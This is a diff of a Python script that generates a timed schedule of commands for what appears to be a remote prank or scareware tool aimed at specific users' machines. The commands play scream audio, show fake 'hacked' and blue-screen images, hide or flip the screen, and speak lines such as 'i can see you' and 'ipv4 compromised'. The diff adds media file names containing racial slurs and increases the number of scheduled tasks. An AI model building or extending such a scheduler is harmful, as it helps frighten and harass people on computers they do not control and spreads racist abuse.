@@ -1,3 +1,6 @@
+import random
+import json
+from datetime import datetime, timedelta
 speak_phrases= [
   "i can see you",
   "ipv4 compromised",
@@ -133,15 +136,12 @@ speak_phrases= [
   "follow MS32 and enter the code",
   "tap in. join MS32"
 ]
-import random
-import json
-from datetime import datetime, timedelta
 
 # --- Command Pools ---
 play_files = [
     "maxverstrappen.mp3", "scream.mp3", "coffin.mp3", "nosignal.mp3",
     "under water.mp3", "tsunami.mp3", "phonk.mp3", "shutup.mp3",
-    "shocked.mp3", "laugh.mp3"
+    "shocked.mp3", "laugh.mp3","niggaphonk.mp3","nigger.mp3"
 ]
 img_files = ["nosignal.jpg", "bsod2.jpg", "bsod.jpg", "black.jpg", "hacked.jpg", "broken.jpg"]
 video_files = ["no signal.mp4", "niggadance.mp4", "gae.mp4", "glitch.mp4", "loading.mp4", "video-282.mp4", "errors.mp4"]
@@ -157,11 +157,11 @@ speak_phrases = [
 toggle_cmds = ["hIdE", "fLiP", "bLoCk"]
 
 # --- Users ---
-users = ["101", "101LX", "103W", "103LX", "101", "101LX", "103W", "103LX", "93", "94"]
+users = ["101", "101LX", "103W", "103LXG", "93", "94"]
 
 # --- Time Range ---
-start_time = datetime.strptime("08-07-2025 08:15", "%d-%m-%Y %H:%M")
-end_time = datetime.strptime("08-07-2025 13:35", "%d-%m-%Y %H:%M")
+start_time = datetime.strptime("11-07-2025 08:15", "%d-%m-%Y %H:%M")
+end_time = datetime.strptime("11-07-2025 13:35", "%d-%m-%Y %H:%M")
 total_minutes = int((end_time - start_time).total_seconds() // 60)
 
 # --- Command Generator ---
@@ -190,7 +190,7 @@ def get_random_command(allowed_types=None):
         return [f"{cmd} on", f"{cmd} off"]
 
 # --- Task Generation ---
-total_tasks = 420
+total_tasks = 700
 task_id = 0
 tasks = []
 
@@ -206,7 +206,7 @@ while len(tasks) < total_tasks:
         cmd = get_random_command(allowed_types=["pLaY"])
     elif user in ["93", "94"]:
         # 93/94 → all allowed
-        cmd = get_random_command()
+        cmd = get_random_command(allowed_types=["eRr", "sPeAk", "oPeN", "toggle"])
     else:
         # Normal users → all except pLaY
         cmd = get_random_command(allowed_types=["iMg", "vIdEo", "eRr", "sPeAk", "oPeN", "toggle"])
